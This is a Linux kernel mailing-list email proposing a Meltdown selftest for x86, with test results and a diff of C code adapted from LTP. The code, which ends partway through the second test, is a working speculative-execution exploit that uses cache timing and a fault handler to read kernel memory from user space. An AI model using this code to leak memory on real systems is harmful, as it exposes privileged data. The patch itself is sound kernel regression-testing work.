Return-Path: <linux-kselftest-owner@vger.kernel.org>
X-Original-To: lists+linux-kselftest@lfdr.de
Delivered-To: lists+linux-kselftest@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id D08F067495A
	for <lists+linux-kselftest@lfdr.de>; Fri, 20 Jan 2023 03:29:25 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S229585AbjATC3X (ORCPT <rfc822;lists+linux-kselftest@lfdr.de>);
        Thu, 19 Jan 2023 21:29:23 -0500
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:40776 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S229447AbjATC3X (ORCPT
        <rfc822;linux-kselftest@vger.kernel.org>);
        Thu, 19 Jan 2023 21:29:23 -0500
Received: from mga12.intel.com (mga12.intel.com [192.55.52.136])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id EA89C9CBA7;
        Thu, 19 Jan 2023 18:29:20 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
  t=1674181760; x=1705717760;
  h=date:from:to:cc:subject:message-id:mime-version;
  bh=IWJMdewlFq7GMN88R7pYb5Uhth9b4YL5Nay7U92AU6Q=;
  b=L+z2P+7UgZ3hcjDSA+4md9elHhaik/iGyQUbnBxIvdKCD7GqH3ETO9Rt
   q1R0n+3RXpgK57m95o3XqVUdoKnStzvyVCQzI9edCJR+vImCm1i8mMkXx
   o2mDFmQe7IucoCHF/pMkVOWtDypjWybmCTiygpDWoSRim117XEhHtRFvL
   x7Ybhc/D1JI6QF1Bq70apfYB6mRLQkO29HZELG4zwcvywA5R+N9Yqy+y0
   VaXd6rLkQvmJFHXZUkyEKEC9/ndcesj/1BS7OLgiGN1Y2+rrxD7VdboxZ
   5Fc2XN0PyOy29ouAzk4H2/I8x0i4fIlXLluXILcAW+CRtw/wrb+s5YVp5
   g==;
X-IronPort-AV: E=McAfee;i="6500,9779,10595"; a="305165987"
X-IronPort-AV: E=Sophos;i="5.97,230,1669104000"; 
   d="scan'208";a="305165987"
Received: from fmsmga006.fm.intel.com ([10.253.24.20])
  by fmsmga106.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 19 Jan 2023 18:29:20 -0800
X-ExtLoop1: 1
X-IronPort-AV: E=McAfee;i="6500,9779,10595"; a="905816166"
X-IronPort-AV: E=Sophos;i="5.97,230,1669104000"; 
   d="scan'208";a="905816166"
Received: from orsmsx603.amr.corp.intel.com ([10.22.229.16])
  by fmsmga006.fm.intel.com with ESMTP; 19 Jan 2023 18:29:14 -0800
Received: from orsmsx610.amr.corp.intel.com (10.22.229.23) by
 ORSMSX603.amr.corp.intel.com (10.22.229.16) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2507.16; Thu, 19 Jan 2023 18:29:09 -0800
Received: from ORSEDG601.ED.cps.intel.com (10.7.248.6) by
 orsmsx610.amr.corp.intel.com (10.22.229.23) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2507.16 via Frontend Transport; Thu, 19 Jan 2023 18:29:09 -0800
Received: from NAM12-DM6-obe.outbound.protection.outlook.com (104.47.59.177)
 by edgegateway.intel.com (134.134.137.102) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.1.2507.16; Thu, 19 Jan 2023 18:29:08 -0800
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=lgG/0lghdQdEHB7jBdu/5Bd3tPwTf9CR7+Bq0cL9KopcOj9gK4ZRv4QZ/GocEvjsPPKrUXtX8h8HWSU1cHMxCjBy9KbDxBIvS4JyLbzCT8QBTg/X1B1A2StUSReBjoOIVmmtgJ5ruAE67dMyfH1xNfvwM3D61JobKIepRT/xF+84F85J59ngJa9vmRmPP0w4gQAR9K1eRwr61BW6vCg8qzn+U8hUN8UK0NABUh27Lejt4qW73VPiTNZHRvJTdDHMHt9T/0XgJkCRpu5v28inqUd9qZnLAdbESgkXabbzAZ7xb9OanSSvRD11xMo+fV8G/i5igFbOrxZecC4iiJxc/Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=aPQiT3xknX2QHuw5zwNtOBF0BDKXa2ta2cPVT0nNQJ4=;
 b=NY9ZZh/qKNy3jxRwbt8xObBE9b1kFEiYlicPXwr4RK4cDtUeoi2WW7Z9Q2qzeAFM1pngO/RihW/SOc3fxtjbdb6OJDqtAIeOG9ewucr/2dB+AtdRgXEUdKvNf3FJuux6ktygBT/yTJyq4lXrxDnQkA0h8xJJ2wzsaktOo2D2Ahe787UVArLuAWe8o6TMkP92N96dlr0ErksG/XVmOtxNfRMxiZagDUW5tX7s/lnlf6w4Gf36qZt+OOJrRao+u1nNSFD+PwZ2iltIw63Afko/BYs5QFEcSKS4ZEpFMUqcuVR3EhI3IHvknKnkon3wllZvXic86GlyF4DcvofLNNj4cg==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=intel.com; dmarc=pass action=none header.from=intel.com;
 dkim=pass header.d=intel.com; arc=none
Authentication-Results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=intel.com;
Received: from BYAPR11MB3062.namprd11.prod.outlook.com (2603:10b6:a03:92::18)
 by SJ0PR11MB5663.namprd11.prod.outlook.com (2603:10b6:a03:3bc::9) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6002.24; Fri, 20 Jan
 2023 02:29:01 +0000
Received: from BYAPR11MB3062.namprd11.prod.outlook.com
 ([fe80::e478:cda7:b9c4:c457]) by BYAPR11MB3062.namprd11.prod.outlook.com
 ([fe80::e478:cda7:b9c4:c457%5]) with mapi id 15.20.6002.013; Fri, 20 Jan 2023
 02:29:00 +0000
Date:   Fri, 20 Jan 2023 10:28:49 +0800
From:   Aaron Lu <aaron.lu@intel.com>
To:     Dave Hansen <dave.hansen@intel.com>,
        Pavel Boldin <boldin.pavel@gmail.com>,
        Greg KH <gregkh@linuxfoundation.org>
CC:     "Raphael S. Carvalho" <raphaelsc@scylladb.com>,
        Daniel Gruss <daniel.gruss@iaik.tugraz.at>,
        Igor Seletskiy <i@cloudlinux.com>,
        <linux-kselftest@vger.kernel.org>, <linux-kernel@vger.kernel.org>
Subject: [PATCH v2] selftest/x86/meltdown: Add a selftest for meltdown
Message-ID: <Y8n8YTgjSIw4speQ@ziqianlu-desk1>
Content-Type: text/plain; charset="us-ascii"
Content-Disposition: inline
X-ClientProxiedBy: SG2PR01CA0185.apcprd01.prod.exchangelabs.com
 (2603:1096:4:189::19) To BYAPR11MB3062.namprd11.prod.outlook.com
 (2603:10b6:a03:92::18)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: BYAPR11MB3062:EE_|SJ0PR11MB5663:EE_
X-MS-Office365-Filtering-Correlation-Id: a03a4ba1-81b2-4d47-40ee-08dafa8e16f2
X-LD-Processed: 46c98d88-e344-4ed4-8496-4ed7712e255d,ExtAddr
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: yBWfshKN4dCOR9AbEcQx3tVplLUMdUYHwFrGqTAauRsFYOY/QUaWcXLNR5T42aPoj/bI8MHkT94SnIlz4W5hgkZxlEnHAnQPMnekfIywI3HBOgc7cQsePyaR8SXCCBxWLZjQgnWU1UOtSTtvxTeUO+tJAGKRj2yWFIA7xvhfskcBNUqf+O12Gyl0OvnJX8Wfx8sx1kCXYVk5sgpfrc7RE9VZ7eTLOjMwUAIyAxrsvhlzPBC37z2LpzRyHqfKzVP93dz1VFOv6uPWWdjJcT1VN2S8luu5N0ALX51aeqUADg52K4EgInZuWlENA9TLMTJvQwgi8OTsrNa/WQTMhHwOLUYcbCSRXTeshxa5mAa2f8keAmPMdG3QNUEKz+0+dPOsC2ANV2FLldSQRN7k/ak0zm6IAHCxbkD6Jv1Nci8v/bGorq+BR4s5UYDFCITs9UjRjKvWpMS9ArIRUoo6ZEfJhEeF86B/sWVB5fbAhiEn8XAFek6I9DuLICk/qC/vlFUK4RhAvFxy/lqTlil6K/63FDpEoLazXPWFDWWxsCpzHhL03+RCum97ik3xfQ35rFCwyxUHgwTGZYn6hLgTDN1T5D/7sauZ7Cik6z+Zr3r6esa2EtKMFzGqP8e+HVnELneweg0J7itQgMoIh+lccwErZDQ9ppMIkdyUW9hIpzj6uVU=
X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:BYAPR11MB3062.namprd11.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230022)(7916004)(376002)(366004)(136003)(346002)(39860400002)(396003)(451199015)(6506007)(86362001)(44832011)(8936002)(2906002)(66476007)(5660300002)(82960400001)(66946007)(38100700002)(66556008)(30864003)(316002)(6666004)(54906003)(110136005)(966005)(4326008)(478600001)(6486002)(186003)(33716001)(41300700001)(8676002)(83380400001)(6512007)(9686003)(26005);DIR:OUT;SFP:1102;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: =?us-ascii?Q?PKLFpxe7O4G5Q1pBD4Y5oJ+Q78PiuFhArRV+Cwhn1ShiM9+K5tjRRNiNqUNA?=
 =?us-ascii?Q?mytwUhLbNvVoXt+pATfV8vglJEjpD/MvewxEzy0whBut17FrLGOGlBvTtXhT?=
 =?us-ascii?Q?OF1ZvyiK3USc5tE0vOIU47aKxLYidVbTlrWOxceYjHSqHVA/4ssxhnpRWmpj?=
 =?us-ascii?Q?z7u2j/hmjEJLVUUDxfMlq6cUDBq73HZTXRTLr9/spqwc2leRsga/9hkKxAsl?=
 =?us-ascii?Q?d4HQdAZOtcv5le+8DYBNTXY8bK5k+E3XBxt64KiQKfjTWFu7Z4Eg2K1IlWwe?=
 =?us-ascii?Q?9XvNTDr/JnEstq9gZQFqICMB1gtCU3/1HLj6NEic5REHSKT3M4Fo35gvtJVA?=
 =?us-ascii?Q?aSx1mvJsRE7LzQJb35Mhfnuk1LOjYGm6x15z1ubtr460dycl0ZsdYbvgPpMa?=
 =?us-ascii?Q?7SPDnQX5H9S1T23zr4zF0xKZSiRROfVhwS6ohQEDiYttB5GFFzlxktKZ4g6L?=
 =?us-ascii?Q?0jdVG9bSHgJqbAScE8MemmBjIWVNDf2iA47oxhcF6cgGIzLXBVq6Qwh7BAI3?=
 =?us-ascii?Q?TXP0rvHxaVf41S+Y5kipqILJNiFgOGk6gD8HYpsP46CYiqPVSIjPSasB1/dL?=
 =?us-ascii?Q?fFNKAU38bMo+xQghlcfk38RkaXnSdtuod5tOFUavSgSd43k0/9yAKBX7FzGy?=
 =?us-ascii?Q?GjnBtQ2yI1Gi1Fr3gXeYt1j2me4DW5ceFAXoSqREP7BJe1dr5BSeXWql5vlP?=
 =?us-ascii?Q?xFRHVnkxW1Ms9rSam0RmR4ANkEdowYiakT3hr6KmYwYBdWIbizlmEXD2eLf1?=
 =?us-ascii?Q?Pm2GsSRwXafRvqLxhjGmuNx1q5BWhxpOV15uC6Ia5o4lkERbU5oV664t9ij1?=
 =?us-ascii?Q?MSFm+rx//vXhg7KDJ2MwJl1EpfzdgY6ntWhjSj4CTMd+HWj+27RmN3NTgpo+?=
 =?us-ascii?Q?ubOGz+8qpWCDDqTJ3OvCL4VwbX3BVSCBk4vj2YYlawZx4A2O22lPbb6uMIzg?=
 =?us-ascii?Q?mS99dcdrBwB5wQfdgkDo/1PTPYVaWjlkqPa3a6vqnfN8eteoSp2EGHDkUxBw?=
 =?us-ascii?Q?gIHe63sRazQJ+6++Rpvgsln/4lzy89RnQO7iVDyaRhxj0bq1dp/6N6bDojg3?=
 =?us-ascii?Q?qgKWOhTAU9tOdLFuo8BMQAVCA2XBZW9DDnc2sMiQnhtEO45VDFFyC0OZ4SgT?=
 =?us-ascii?Q?Nk/qkJeE7n+8hm6KdP5Saw9N7CUMmCgE4VOH7y4/Ml0uA4IEV/yPFkJ3B58d?=
 =?us-ascii?Q?QGpwmFReD3jmemafiaaJC1GBgyju99A1sIOj8kQ68DA35et4xSw5VIQ63I32?=
 =?us-ascii?Q?S0DDCwhN1LPWLzZosXx9ZQ3YZGz3+FEDZOikpWnaqsFUaTC1Zam+p15fY6S2?=
 =?us-ascii?Q?gZ+RHdgNjWs5W/fwuW7oy++XdR+PxjJ5hcqSUMi+RFp5HZj3KxzOcp4pulvW?=
 =?us-ascii?Q?Q2c4xryFoQlhFKwoSonNTqGswXChVfLj0v/rKRxD62WE84t3JSsnoOYTAvkI?=
 =?us-ascii?Q?gO0J8fEbeiSQr9gP54zsMAvHuO28DlkrAwcyjC/o6U9iI6QaPbLSVSA/kYs5?=
 =?us-ascii?Q?oay6am5GSRSBs+3geSf0pLdBMIQgRKf+euQCf5K818sXeyKBG4FTWKeXX69R?=
 =?us-ascii?Q?eX7NCg+/oKgqe9YKIudE5kETKoXv48IxaI1FC0lN?=
X-MS-Exchange-CrossTenant-Network-Message-Id: a03a4ba1-81b2-4d47-40ee-08dafa8e16f2
X-MS-Exchange-CrossTenant-AuthSource: BYAPR11MB3062.namprd11.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 20 Jan 2023 02:29:00.4715
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 46c98d88-e344-4ed4-8496-4ed7712e255d
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: bHHn97u16yGfayqgHgVP+v2ot6LX79yM0tbocOZFvrPuy7oEjObs12VRwT/BnyjKCgXUoDaM4f2Jh72pF4G37Q==
X-MS-Exchange-Transport-CrossTenantHeadersStamped: SJ0PR11MB5663
X-OriginatorOrg: intel.com
X-Spam-Status: No, score=-4.4 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_MED,
        SPF_HELO_PASS,SPF_NONE autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kselftest.vger.kernel.org>
X-Mailing-List: linux-kselftest@vger.kernel.org

To capture potential programming errors like mistakenly setting Global
bit on kernel page table entries, a selftest for meltdown is added.

This selftest is based on
https://github.com/linux-test-project/ltp/blob/master/testcases/cve/meltdown.c

In addition to the existing test of reading kernel variable
saved_command_line from user space, one more test of reading user local
variable through kernel direct map address is added. For the existing
test to report a failure, both the high kernel mapping and low kernel
mapping have to be in leaked state; For the added test, only low kernel
mapping leak is enough to trigger a test fail, so both tests are useful.

Test results of 10 runs:

On v6.1-rc8 with nopti kernel cmdline option:

host              test_out_rate_1    test_out_rate_2
lkp-bdw-de1            50%               100%
lkp-hsw-d01            70%               100%
lkp-hsw-d02             0%                80%
lkp-hsw-d03            60%               100%
lkp-hsw-d04            20%               100%
lkp-hsw-d05            60%               100%
lkp-ivb-d01             0%                70%
lkp-kbl-d01           100%               100%
lkp-skl-d02           100%                90%
lkp-skl-d03            90%               100%
lkp-skl-d05            60%               100%
kbl-vm                100%                80%
2 other machines have 0% rate for both tests.

bdw=broadwell, hsw=haswell, ivb=ivybridge, etc.

test_out_rate_1: test reports fail rate for the test of reading
saved_command_line from user space;
test_out_rate_2: test reports fail rate for the test of reading user
local variable through kernel direct map address in user space.

On v5.19 without nopti cmdline option:
host              test_out_rate_2
lkp-bdw-de1            80%
lkp-hsw-4ex1           50%
lkp-hsw-d01            30%
lkp-hsw-d03            10%
lkp-hsw-d04            10%
lkp-kbl-d01            10%
kbl-vm                 80%
7 other machines have 0% rate for test2.

Also tested on an i386 VM with 512M memory and the test out rate is 100%
when adding nopti to kernel cmdline with v6.1-rc8.

Main changes I made from ltp's meltdown test:
- Replace rdtscll() and clflush() with kernel's implementation;
- Reimplement find_symbol_in_file() to avoid bringing in LTP's library
  functions;
- Coding style changes: placing the function return type in the same
  line of the function.

Signed-off-by: Aaron Lu <aaron.lu@intel.com>
Reviewed-by: Pavel Boldin <boldin.pavel@gmail.com>
---
v2: add Pavel Boldin's reviewed-by tag.

 tools/testing/selftests/x86/Makefile   |   2 +-
 tools/testing/selftests/x86/meltdown.c | 529 +++++++++++++++++++++++++
 2 files changed, 530 insertions(+), 1 deletion(-)
 create mode 100644 tools/testing/selftests/x86/meltdown.c

diff --git a/tools/testing/selftests/x86/Makefile b/tools/testing/selftests/x86/Makefile
index 0388c4d60af0..36f99c360a56 100644
--- a/tools/testing/selftests/x86/Makefile
+++ b/tools/testing/selftests/x86/Makefile
@@ -13,7 +13,7 @@ CAN_BUILD_WITH_NOPIE := $(shell ./check_cc.sh "$(CC)" trivial_program.c -no-pie)
 TARGETS_C_BOTHBITS := single_step_syscall sysret_ss_attrs syscall_nt test_mremap_vdso \
 			check_initial_reg_state sigreturn iopl ioperm \
 			test_vsyscall mov_ss_trap \
-			syscall_arg_fault fsgsbase_restore sigaltstack
+			syscall_arg_fault fsgsbase_restore sigaltstack meltdown
 TARGETS_C_32BIT_ONLY := entry_from_vm86 test_syscall_vdso unwind_vdso \
 			test_FCMOV test_FCOMI test_FISTTP \
 			vdso_restorer
diff --git a/tools/testing/selftests/x86/meltdown.c b/tools/testing/selftests/x86/meltdown.c
new file mode 100644
index 000000000000..fcb211dc9038
--- /dev/null
+++ b/tools/testing/selftests/x86/meltdown.c
@@ -0,0 +1,529 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (c) 2018 Pavel Boldin <pboldin@cloudlinux.com>
+ * https://github.com/linux-test-project/ltp/blob/master/testcases/cve/meltdown.c
+ */
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdarg.h>
+#include <string.h>
+#include <signal.h>
+#include <ucontext.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <ctype.h>
+#include <sys/utsname.h>
+#include <sys/mman.h>
+
+#define PAGE_SHIFT	12
+#define PAGE_SIZE	0x1000
+#define PUD_SHIFT       30
+#define PUD_SIZE        (1UL << PUD_SHIFT)
+#define PUD_MASK        (~(PUD_SIZE - 1))
+
+size_t cache_miss_threshold;
+unsigned long directmap_base;
+
+#define TARGET_OFFSET	9
+#define TARGET_SIZE	(1 << TARGET_OFFSET)
+#define BITS_BY_READ	2
+
+static inline uint64_t rdtsc(void)
+{
+	uint32_t eax, edx;
+	uint64_t tsc_val;
+	/*
+	 * The lfence is to wait (on Intel CPUs) until all previous
+	 * instructions have been executed. If software requires RDTSC to be
+	 * executed prior to execution of any subsequent instruction, it can
+	 * execute LFENCE immediately after RDTSC
+	 *                                              */
+	__asm__ __volatile__("lfence; rdtsc; lfence" : "=a"(eax), "=d"(edx));
+	tsc_val = ((uint64_t)edx) << 32 | eax;
+	return tsc_val;
+}
+
+static inline void clflush(volatile void *__p)
+{
+	asm volatile("clflush %0" : "+m" (*(volatile char *)__p));
+}
+
+static char target_array[BITS_BY_READ * TARGET_SIZE];
+
+static void clflush_target(void)
+{
+	int i;
+
+	for (i = 0; i < BITS_BY_READ; i++)
+		clflush(&target_array[i * TARGET_SIZE]);
+}
+
+extern char failshere[];
+extern char stopspeculate[];
+
+static void __attribute__((noinline)) speculate(unsigned long addr, char bit)
+{
+	register char mybit asm ("cl") = bit;
+#ifdef __x86_64__
+	asm volatile (
+		"1:\n\t"
+
+		".rept 300\n\t"
+		"add $0x141, %%rax\n\t"
+		".endr\n"
+
+		"failshere:\n\t"
+		"movb (%[addr]), %%al\n\t"
+		"ror %[bit], %%rax\n\t"
+		"and $1, %%rax\n\t"
+		"shl $9, %%rax\n\t"
+		"jz 1b\n\t"
+
+		"movq (%[target], %%rax, 1), %%rbx\n"
+
+		"stopspeculate: \n\t"
+		"nop\n\t"
+		:
+		: [target] "r" (target_array),
+		  [addr] "r" (addr),
+		  [bit] "r" (mybit)
+		: "rax", "rbx"
+	);
+#else /* defined(__x86_64__) */
+	asm volatile (
+		"1:\n\t"
+
+		".rept 300\n\t"
+		"add $0x141, %%eax\n\t"
+		".endr\n"
+
+		"failshere:\n\t"
+		"movb (%[addr]), %%al\n\t"
+		"ror %[bit], %%eax\n\t"
+		"and $1, %%eax\n\t"
+		"shl $9, %%eax\n\t"
+		"jz 1b\n\t"
+
+		"movl (%[target], %%eax, 1), %%ebx\n"
+
+		"stopspeculate: \n\t"
+		"nop\n\t"
+		:
+		: [target] "r" (target_array),
+		  [addr] "r" (addr),
+		  [bit] "r" (mybit)
+		: "rax", "ebx"
+	);
+#endif
+}
+
+#ifdef __i386__
+# define REG_RIP	REG_EIP
+#endif
+
+static void sigsegv(int sig, siginfo_t *siginfo, void *context)
+{
+	ucontext_t *ucontext = context;
+	unsigned long *prip = (unsigned long *)&ucontext->uc_mcontext.gregs[REG_RIP];
+	if (*prip != (unsigned long)failshere) {
+		printf("Segmentation fault at unexpected location %lx\n", *prip);
+		abort();
+	}
+	*prip = (unsigned long)stopspeculate;
+	return;
+}
+
+static int set_signal(void)
+{
+	struct sigaction act = {
+		.sa_sigaction = sigsegv,
+		.sa_flags = SA_SIGINFO,
+	};
+
+	return sigaction(SIGSEGV, &act, NULL);
+}
+
+static inline int get_access_time(volatile char *addr)
+{
+	unsigned long long time1, time2;
+	volatile int j __attribute__((__unused__));
+
+	time1 = rdtsc();
+	j = *addr;
+	time2 = rdtsc();
+
+	return time2 - time1;
+}
+
+static int cache_hit_threshold;
+static int hist[BITS_BY_READ];
+
+static void check(void)
+{
+	int i, time;
+	volatile char *addr;
+
+	for (i = 0; i < BITS_BY_READ; i++) {
+		addr = &target_array[i * TARGET_SIZE];
+
+		time = get_access_time(addr);
+
+		if (time <= cache_hit_threshold)
+			hist[i]++;
+	}
+}
+
+#define CYCLES 10000
+static int readbit(int fd, unsigned long addr, char bit)
+{
+	int i, ret;
+	static char buf[256];
+
+	memset(hist, 0, sizeof(hist));
+
+	for (i = 0; i < CYCLES; i++) {
+		/*
+		 * Make the to-be-stolen data cache and tlb hot
+		 * to increase success rate.
+		 */
+		ret = pread(fd, buf, sizeof(buf), 0);
+		if (ret < 0)
+			printf("[INFO]\tCan't read fd");
+
+		clflush_target();
+
+		speculate(addr, bit);
+		check();
+	}
+
+	if (hist[1] > CYCLES / 10)
+		return 1;
+	return 0;
+}
+
+static int readbyte(int fd, unsigned long addr)
+{
+	int bit, res = 0;
+
+	for (bit = 0; bit < 8; bit ++ )
+		res |= (readbit(fd, addr, bit) << bit);
+
+	return res;
+}
+
+static int mysqrt(long val)
+{
+	int root = val / 2, prevroot = 0, i = 0;
+
+	while (prevroot != root && i++ < 100) {
+		prevroot = root;
+		root = (val / root + root) / 2;
+	}
+
+	return root;
+}
+
+#define ESTIMATE_CYCLES	1000000
+static void set_cache_hit_threshold(void)
+{
+	long cached, uncached, i;
+
+	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
+		cached += get_access_time(target_array);
+
+	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
+		cached += get_access_time(target_array);
+
+	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
+		clflush(target_array);
+		uncached += get_access_time(target_array);
+	}
+
+	cached /= ESTIMATE_CYCLES;
+	uncached /= ESTIMATE_CYCLES;
+
+	cache_hit_threshold = mysqrt(cached * uncached);
+
+	printf("[INFO]\taccess time: cached = %ld, uncached = %ld, threshold = %d\n",
+		cached, uncached, cache_hit_threshold);
+}
+
+static unsigned long find_symbol_in_file(const char *filename, const char *symname)
+{
+	unsigned long addr;
+	char type, *buf;
+	int found;
+	FILE *fp;
+
+	fp = fopen(filename, "r");
+	if (!fp) {
+		printf("[INFO]\tFailed to open %s\n", filename);
+		return 0;
+	}
+
+	buf = malloc(4096);
+	if (!buf)
+		return 0;
+
+	found = 0;
+	while (fscanf(fp, "%lx %c %s\n", &addr, &type, buf)) {
+		if (!strcmp(buf, symname)) {
+			found = 1;
+			break;
+		}
+	}
+
+	free(buf);
+	fclose(fp);
+
+	return found ? addr : 0;
+}
+
+static unsigned long find_kernel_symbol(const char *name)
+{
+	char systemmap[256];
+	struct utsname utsname;
+	unsigned long addr;
+
+	addr = find_symbol_in_file("/proc/kallsyms", name);
+	if (addr)
+		return addr;
+
+	if (uname(&utsname) < 0)
+		return 0;
+	sprintf(systemmap, "/boot/System.map-%s", utsname.release);
+	addr = find_symbol_in_file(systemmap, name);
+	return addr;
+}
+
+static unsigned long saved_cmdline_addr;
+static int spec_fd;
+
+#define READ_SIZE 32
+
+static int test_read_saved_command_line(void)
+{
+	unsigned int i, score = 0, ret;
+	unsigned long addr;
+	unsigned long size;
+	char read[READ_SIZE] = { 0 };
+	char expected[READ_SIZE] = { 0 };
+	int expected_len;
+
+	saved_cmdline_addr = find_kernel_symbol("saved_command_line");
+	if (!saved_cmdline_addr) {
+		printf("[SKIP]\tCan not find symbol saved_command_line\n");
+		return 0;
+	}
+	printf("[INFO]\tsaved_cmdline_addr: 0x%lx\n", saved_cmdline_addr);
+
+	spec_fd = open("/proc/cmdline", O_RDONLY);
+	if (spec_fd == -1) {
+		printf("[SKIP]\tCan not open /proc/cmdline\n");
+		return 0;
+	}
+
+	expected_len = pread(spec_fd, expected, sizeof(expected), 0);
+	if (expected_len < 0) {
+		printf("[SKIP]\tCan't read /proc/cmdline\n");
+		return 0;
+	}
+
+	/* read address of saved_cmdline_addr */
+	addr = saved_cmdline_addr;
+	size = sizeof(addr);
+	for (i = 0; i < size; i++) {
+		ret = readbyte(spec_fd, addr);
+		read[i] = ret;
+		addr++;
+	}
+
+	/* read value pointed to by saved_cmdline_addr */
+	memcpy(&addr, read, sizeof(addr));
+	memset(read, 0, sizeof(read));
+	printf("[INFO]\tsaved_command_line: 0x%lx\n", addr);
+	size = expected_len;
+
+	if (!addr)
+		goto done;
+
+	for (i = 0; i < size; i++) {
+		ret = readbyte(spec_fd, addr);
+		read[i] = ret;
+		addr++;
+	}
+
+	for (i = 0; i < size; i++)
+		if (expected[i] == read[i])
+			score++;
+
+done:
+	if (score > size / 2) {
+		printf("[FAIL]\ttest_read_saved_command_line: both high and low kernel mapping leak found.\n");
+		ret = -1;
+	} else {
+		printf("[OK]\ttest_read_saved_command_line: no leak found.\n");
+		ret = 0;
+	}
+
+	close(spec_fd);
+
+	return ret;
+}
+
+static int get_directmap_base(void)
+{
+	char *buf;
+	FILE *fp;
+	size_t n;
+	int ret;
+
+	fp = fopen("/sys/kernel/debug/page_tables/kernel", "r");
+	if (!fp)
+		return -1;
+
+	buf = NULL;
+	ret = -1;
+	while (getline(&buf, &n, fp) != -1) {
+		if (!strstr(buf, "Kernel Mapping"))
+			continue;
+
+		if (getline(&buf, &n, fp) != -1 &&
+		    sscanf(buf, "0x%lx", &directmap_base) == 1) {
+			printf("[INFO]\tdirectmap_base=0x%lx/0x%lx\n", directmap_base, directmap_base & PUD_MASK);
+			directmap_base &= PUD_MASK;
+			ret = 0;
+			break;
+		}
+	}
+
+	fclose(fp);
+	free(buf);
+	return ret;
+}
+
+static int virt_to_phys(unsigned long virt, unsigned long *phys)
+{
+	unsigned long pfn;
+	uint64_t val;
+	int fd, ret;
+
+	fd = open("/proc/self/pagemap", O_RDONLY);
+	if (fd == -1) {
+		printf("[INFO]\tFailed to open pagemap\n");
+		return -1;
+	}
+
+	ret = pread(fd, &val, sizeof(val), (virt >> PAGE_SHIFT) * sizeof(uint64_t));
+	if (ret == -1) {
+		printf("[INFO]\tFailed to read pagemap\n");
+		goto out;
+	}
+
+	if (!(val & (1ULL << 63))) {
+		printf("[INFO]\tPage not present according to pagemap\n");
+		ret = -1;
+		goto out;
+	}
+
+	pfn = val & ((1ULL << 55) - 1);
+	if (pfn == 0) {
+		printf("[INFO]\tNeed CAP_SYS_ADMIN to show pfn\n");
+		ret = -1;
+		goto out;
+	}
+
+	ret = 0;
+	*phys = (pfn << PAGE_SHIFT) | (virt & (PAGE_SIZE - 1));
+
+out:
+	close(fd);
+	return ret;
+}
+
+static int test_read_local_var(void)
+{
+	char path[] = "/tmp/meltdown.XXXXXX";
+	char string[] = "test string";
+	unsigned long phys;
+	int i, len, ret;
+	char *result;
+	void *p;
+
+	if (get_directmap_base() == -1) {
+		printf("[SKIP]\tFailed to get directmap base. Need root and CONFIG_PTDUMP_DEBUGFS\n");
+		return 0;
+	}
+
+	spec_fd = mkstemp(path);
+	if (spec_fd == -1) {
+		printf("[SKIP]\tCan not open %s\n", path);
+		return 0;
+	}
+	ftruncate(spec_fd, 0x1000);
+
+	p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, spec_fd, 0);
+	if (p == MAP_FAILED) {
+		printf("[SKIP]\tmmap spec_fd failed\n");
+		return 0;
+	}
